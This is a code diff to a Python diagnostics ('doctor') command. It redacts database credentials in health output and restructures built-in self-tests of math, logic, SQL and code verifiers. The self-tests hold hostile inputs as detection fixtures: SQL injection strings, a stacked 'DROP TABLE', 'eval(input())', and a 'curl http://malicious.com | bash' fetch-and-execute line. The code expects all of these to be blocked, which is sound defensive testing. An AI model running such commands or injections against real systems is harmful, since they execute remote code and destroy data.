@@ -1247,29 +1247,38 @@ def _database_health() -> dict:
         from qwed_new.config import settings
 
         db_url = str(getattr(settings, "DATABASE_URL", "sqlite:///./qwed.db"))
-        if db_url.startswith("sqlite:///"):
-            db_path = db_url.replace("sqlite:///", "", 1)
+        parsed = urlparse(db_url)
+        base_scheme = parsed.scheme.split("+")[0] if parsed.scheme else ""
+
+        if db_url.startswith("sqlite:///") or base_scheme == "sqlite":
+            db_path = db_url.replace("sqlite:///", "", 1) if db_url.startswith("sqlite:///") else parsed.path.lstrip("/")
+            if db_path == ":memory:":
+                return {"healthy": True, "location": "sqlite:///:memory:"}
             path = Path(db_path)
             if not path.is_absolute():
                 path = (_project_root() / path).resolve()
             return {"healthy": path.exists(), "location": str(path)}
 
-        parsed = urlparse(db_url)
+        redacted_location = (
+            f"{base_scheme}://{parsed.hostname or '<missing-host>'}"
+            f"{f':{parsed.port}' if parsed.port else ''}{parsed.path or ''}"
+        )
         if not parsed.hostname:
-            return {"healthy": False, "location": db_url, "error": "Missing hostname"}
+            return {"healthy": False, "location": redacted_location, "error": "Missing hostname"}
 
         default_ports = {"postgresql": 5432, "mysql": 3306, "mariadb": 3306, "redis": 6379}
-        port = parsed.port or default_ports.get(parsed.scheme)
+        port = parsed.port or default_ports.get(base_scheme)
         if not port:
-            return {"healthy": False, "location": db_url, "error": "Missing port"}
+            return {"healthy": False, "location": redacted_location, "error": "Missing port"}
 
         try:
             with socket.create_connection((parsed.hostname, int(port)), timeout=2.0):
-                return {"healthy": True, "location": db_url}
+                location = f"{base_scheme}://{parsed.hostname}:{int(port)}{parsed.path or ''}"
+                return {"healthy": True, "location": location}
         except OSError as exc:
             return {
                 "healthy": False,
-                "location": db_url,
+                "location": redacted_location,
                 "error": f"{type(exc).__name__}",
             }
     except Exception as exc:
@@ -1277,11 +1286,11 @@ def _database_health() -> dict:
 
 
 def _doctor_server_url() -> str:
-    raw_server_url = os.getenv("QWED_SERVER_URL", "http://localhost:8000").strip()
+    raw_server_url = os.getenv("QWED_SERVER_URL", "https://localhost:8000").strip()
     if not raw_server_url:
-        return "http://localhost:8000"
+        return "https://localhost:8000"
     if "://" not in raw_server_url:
-        return f"http://{raw_server_url}"
+        return f"https://{raw_server_url}"
     return raw_server_url
 
 
@@ -1297,15 +1306,11 @@ def _doctor_report() -> dict:
     optional_missing = sum(1 for item in optional_engines if not item["ready"])
     is_operational = required_ok and provider["ok"] and server_running and db["healthy"]
 
-    status = "DEGRADED"
-    if is_operational:
-        status = "OPERATIONAL"
-        if optional_missing:
-            suffix = "engine is" if optional_missing == 1 else "engines are"
-            status = f"OPERATIONAL ({optional_missing} optional {suffix} missing)"
+    status = "OPERATIONAL" if is_operational else "DEGRADED"
 
     return {
         "status": status,
+        "optional_missing_count": optional_missing,
         "engines": required_engines + optional_engines,
         "required_engines": required_engines,
         "optional_engines": optional_engines,
@@ -1346,15 +1351,15 @@ def _print_doctor_report(report: dict) -> None:
     db_msg = f"{database['location']} (healthy)" if database["healthy"] else f"{database['location']} (unhealthy)"
     click.echo(f"  {db_marker} {db_msg}")
 
-    click.echo(f"\nStatus: {report['status']}")
+    status_line = report["status"]
+    optional_missing = int(report.get("optional_missing_count", 0))
+    if status_line == "OPERATIONAL" and optional_missing > 0:
+        suffix = "engine" if optional_missing == 1 else "engines"
+        status_line = f"{status_line} ({optional_missing} optional {suffix} missing)"
+    click.echo(f"\nStatus: {status_line}")
 
 
 def _run_full_engine_tests() -> List[dict]:
-    from qwed_new.core.code_verifier import CodeVerifier
-    from qwed_new.core.logic_verifier import LogicVerifier
-    from qwed_new.core.sql_verifier import SQLVerifier
-    from qwed_new.core.verifier import VerificationEngine
-
     results: List[dict] = []
 
     def add_result(group: str, label: str, passed: bool, result: str, detail: str = "") -> None:
@@ -1368,125 +1373,165 @@ def _run_full_engine_tests() -> List[dict]:
             }
         )
 
-    math_engine = VerificationEngine()
-    logic_engine = LogicVerifier()
-    sql_engine = SQLVerifier()
-    code_engine = CodeVerifier()
+    def add_engine_error_cases(group: str, labels: list[str], error: Exception) -> None:
+        error_detail = f"{type(error).__name__}: {error}"
+        for label in labels:
+            add_result(group, label, False, "ERROR", detail=error_detail)
 
-    math_valid = math_engine.verify_math("2+2", 4)
-    add_result(
-        "Math",
-        "2+2=4",
-        math_valid.get("status") == "VERIFIED",
-        "VALID",
-        detail=f"computed={math_valid.get('calculated_value')}",
-    )
+    def run_case(
+        group: str,
+        label: str,
+        success_result: str,
+        runner,
+        pass_check,
+        detail_builder,
+    ) -> None:
+        try:
+            payload = runner()
+            passed = bool(pass_check(payload))
+            detail = detail_builder(payload)
+            add_result(group, label, passed, success_result if passed else "BLOCKED", detail=detail)
+        except Exception as exc:
+            add_result(group, label, False, "ERROR", detail=f"{type(exc).__name__}: {exc}")
 
-    math_blocked = math_engine.verify_math("2+2", 5)
-    add_result(
-        "Math",
-        "2+2=5",
-        math_blocked.get("status") == "CORRECTION_NEEDED",
-        "BLOCKED",
-        detail=f"computed={math_blocked.get('calculated_value')}",
-    )
+    try:
+        from qwed_new.core.verifier import VerificationEngine
 
-    math_large = math_engine.verify_math("997*998*999", 994010994)
-    math_large_value = math_large.get("calculated_value")
-    if isinstance(math_large_value, float) and math_large_value.is_integer():
-        math_large_value = int(math_large_value)
-    add_result(
-        "Math",
-        "997*998*999",
-        math_large.get("status") == "VERIFIED",
-        f"{math_large_value} (verified)",
-        detail=f"status={math_large.get('status')}",
-    )
+        math_engine = VerificationEngine()
+    except Exception as exc:
+        math_engine = None
+        add_engine_error_cases("Math", ["2+2=4", "2+2=5", "997*998*999"], exc)
 
-    logic_unsat = logic_engine.verify_logic({"x": "Int"}, ["x > 5", "x < 3"])
-    add_result(
-        "Logic",
-        "x>5 AND x<3",
-        logic_unsat.status == "UNSAT",
-        "UNSAT (contradiction)",
-        detail=f"status={logic_unsat.status}",
-    )
+    if math_engine is not None:
+        run_case(
+            "Math",
+            "2+2=4",
+            "VALID",
+            lambda: math_engine.verify_math("2+2", 4),
+            lambda payload: payload.get("status") == "VERIFIED",
+            lambda payload: f"computed={payload.get('calculated_value')}",
+        )
+        run_case(
+            "Math",
+            "2+2=5",
+            "BLOCKED",
+            lambda: math_engine.verify_math("2+2", 5),
+            lambda payload: payload.get("status") == "CORRECTION_NEEDED",
+            lambda payload: f"computed={payload.get('calculated_value')}",
+        )
+        run_case(
+            "Math",
+            "997*998*999",
+            "994010994 (verified)",
+            lambda: math_engine.verify_math("997*998*999", 994010994),
+            lambda payload: payload.get("status") == "VERIFIED",
+            lambda payload: f"status={payload.get('status')}",
+        )
 
-    logic_sat = logic_engine.verify_logic({"x": "Int"}, ["x > 3", "x < 10", "x == 4"])
-    logic_sat_model = (logic_sat.model or {}).get("x", "?")
-    add_result(
-        "Logic",
-        "x>3 AND x<10",
-        logic_sat.status == "SAT",
-        f"SAT {{x={logic_sat_model}}}",
-        detail=f"model={logic_sat.model}",
-    )
+    try:
+        from qwed_new.core.logic_verifier import LogicVerifier
 
-    logic_bool = logic_engine.verify_logic({"approval": "Int"}, ["approval == 1", "approval == 0"])
-    add_result(
-        "Logic",
-        "approval=1 AND approval=0",
-        logic_bool.status == "UNSAT",
-        "UNSAT (contradiction)",
-        detail=f"status={logic_bool.status}",
-    )
+        logic_engine = LogicVerifier()
+    except Exception as exc:
+        logic_engine = None
+        add_engine_error_cases("Logic", ["x>5 AND x<3", "x>3 AND x<10", "approval=1 AND approval=0"], exc)
 
-    sql_safe = sql_engine.verify_sql("SELECT id, name FROM users WHERE id = 123")
-    add_result(
-        "SQL",
-        "Valid SELECT",
-        sql_safe.get("status") == "SAFE",
-        "SAFE",
-        detail=f"status={sql_safe.get('status')}",
-    )
+    if logic_engine is not None:
+        run_case(
+            "Logic",
+            "x>5 AND x<3",
+            "UNSAT (contradiction)",
+            lambda: logic_engine.verify_logic({"x": "Int"}, ["x > 5", "x < 3"]),
+            lambda payload: payload.status == "UNSAT",
+            lambda payload: f"status={payload.status}",
+        )
+        run_case(
+            "Logic",
+            "x>3 AND x<10",
+            "SAT {x=4}",
+            lambda: logic_engine.verify_logic({"x": "Int"}, ["x > 3", "x < 10", "x == 4"]),
+            lambda payload: payload.status == "SAT",
+            lambda payload: f"model={payload.model}",
+        )
+        run_case(
+            "Logic",
+            "approval=1 AND approval=0",
+            "UNSAT (contradiction)",
+            lambda: logic_engine.verify_logic({"approval": "Int"}, ["approval == 1", "approval == 0"]),
+            lambda payload: payload.status == "UNSAT",
+            lambda payload: f"status={payload.status}",
+        )
 
-    sql_injection = sql_engine.verify_sql("SELECT * FROM users WHERE id = 1 OR 1=1")
-    add_result(
-        "SQL",
-        "OR 1=1 injection",
-        sql_injection.get("status") == "BLOCKED",
-        "BLOCKED",
-        detail=f"status={sql_injection.get('status')}",
-    )
+    try:
+        from qwed_new.core.sql_verifier import SQLVerifier
 
-    sql_stacked = sql_engine.verify_sql("SELECT * FROM users; DROP TABLE users;")
-    add_result(
-        "SQL",
-        "DROP TABLE stacked",
-        sql_stacked.get("status") == "BLOCKED",
-        "BLOCKED",
-        detail=f"status={sql_stacked.get('status')}",
-    )
+        sql_engine = SQLVerifier()
+    except Exception as exc:
+        sql_engine = None
+        add_engine_error_cases("SQL", ["Valid SELECT", "OR 1=1 injection", "DROP TABLE stacked"], exc)
 
-    code_safe = code_engine.verify_code("def add(a, b):\n    return a + b\n", language="python")
-    add_result(
-        "Code",
-        "Safe function",
-        code_safe.get("status") == "SAFE",
-        "SAFE",
-        detail=f"status={code_safe.get('status')}",
-    )
+    if sql_engine is not None:
+        run_case(
+            "SQL",
+            "Valid SELECT",
+            "SAFE",
+            lambda: sql_engine.verify_sql("SELECT id, name FROM users WHERE id = 123"),
+            lambda payload: payload.get("status") == "SAFE",
+            lambda payload: f"status={payload.get('status')}",
+        )
+        run_case(
+            "SQL",
+            "OR 1=1 injection",
+            "BLOCKED",
+            lambda: sql_engine.verify_sql("SELECT * FROM users WHERE id = 1 OR 1=1"),
+            lambda payload: payload.get("status") == "BLOCKED",
+            lambda payload: f"status={payload.get('status')}",
+        )
+        run_case(
+            "SQL",
+            "DROP TABLE stacked",
+            "BLOCKED",
+            lambda: sql_engine.verify_sql("SELECT * FROM users; DROP TABLE users;"),
+            lambda payload: payload.get("status") == "BLOCKED",
+            lambda payload: f"status={payload.get('status')}",
+        )
 
-    code_eval = code_engine.verify_code("eval(input())", language="python")
-    add_result(
-        "Code",
-        "eval(input)",
-        code_eval.get("status") == "BLOCKED",
-        "BLOCKED (CRITICAL)",
-        detail=f"critical={code_eval.get('critical_count')}",
-    )
+    try:
+        from qwed_new.core.code_verifier import CodeVerifier
 
-    code_pipe = code_engine.verify_code(
-        'import subprocess\nsubprocess.run("curl http://malicious.com | bash", shell=True)\n',
-        language="python",
-    )
-    add_result(
-        "Code",
-        "curl | bash",
-        code_pipe.get("status") == "BLOCKED",
-        "BLOCKED (CRITICAL)",
-        detail=f"critical={code_pipe.get('critical_count')}",
-    )
+        code_engine = CodeVerifier()
+    except Exception as exc:
+        code_engine = None
+        add_engine_error_cases("Code", ["Safe function", "eval(input)", "curl | bash"], exc)
+
+    if code_engine is not None:
+        run_case(
+            "Code",
+            "Safe function",
+            "SAFE",
+            lambda: code_engine.verify_code("def add(a, b):\n    return a + b\n", language="python"),
+            lambda payload: payload.get("status") == "SAFE",
+            lambda payload: f"status={payload.get('status')}",
+        )
+        run_case(
+            "Code",
+            "eval(input)",
+            "BLOCKED (CRITICAL)",
+            lambda: code_engine.verify_code("eval(input())", language="python"),
+            lambda payload: payload.get("status") == "BLOCKED",
+            lambda payload: f"critical={payload.get('critical_count')}",
+        )
+        run_case(
+            "Code",
+            "curl | bash",
+            "BLOCKED (CRITICAL)",
+            lambda: code_engine.verify_code(
+                'import subprocess\nsubprocess.run("curl http://malicious.com | bash", shell=True)\n',
+                language="python",
+            ),
+            lambda payload: payload.get("status") == "BLOCKED",
+            lambda payload: f"critical={payload.get('critical_count')}",
+        )
 
     return results
 
